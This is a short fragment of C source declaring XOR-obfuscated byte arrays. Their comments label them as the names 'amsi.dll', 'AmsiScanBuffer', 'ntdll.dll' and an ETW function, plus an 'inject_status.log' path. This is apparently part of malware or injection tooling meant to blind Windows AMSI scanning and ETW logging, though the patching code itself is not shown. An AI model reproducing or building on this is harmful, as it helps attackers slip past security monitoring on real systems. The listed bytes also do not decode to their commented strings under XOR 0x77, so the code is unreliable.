...
static const unsigned char xAmsiDll[] = {
    0xCB, 0xC7, 0xD9, 0xC3, 0x84, 0xCE, 0xC6, 0xC6
};
#define xAmsiDll_LEN 8

/* "AmsiScanBuffer" XOR 0x77 */
static const unsigned char xAmsiFunc[] = {
    0xEB, 0xC7, 0xD9, 0xC3, 0xF9, 0xC9, 0xCB, 0xC4,
    0xE8, 0xDF, 0xCC, 0xCC, 0xCF, 0xD8
};
#define xAmsiFunc_LEN 14

/* "ntdll.dll" XOR 0x77 */
static const unsigned char xNtdll[] = {
    0xC4, 0xDE, 0xCE, 0xC6, 0xC6, 0x84, 0xCE, 0xC6,
    0xC6
};
#define xNtdll_LEN 9
...
static const unsigned char xEtwFunc[] = {
    0xEF, 0xDE, 0xDD, 0xEF, 0xDC, 0xCF, 0xC4, 0xDE,
    0xFD, 0xD8, 0xC3, 0xDE, 0xCF
};
#define xEtwFunc_LEN 13

/* "C:\Windows\Temp\inject_status.log" XOR 0x77 */
static const unsigned char xCanaryPath[] = {
    0xE9, 0x90, 0xF6, 0xFD, 0xC3, 0xC4, 0xCE, 0xC5,
    0xDD, 0xD9, 0xF6, 0xFE, 0xCF, 0xC7, 0xDA, 0xF6,
    0xC3, 0xC4, 0xC0, 0xCF, 0xC9, 0xDE, 0xF5, 0xD9,
    0xDE, 0xCB, 0xDE, 0xDF, 0xD9, 0x84, 0xC6, 0xC5,
    0xCD
};
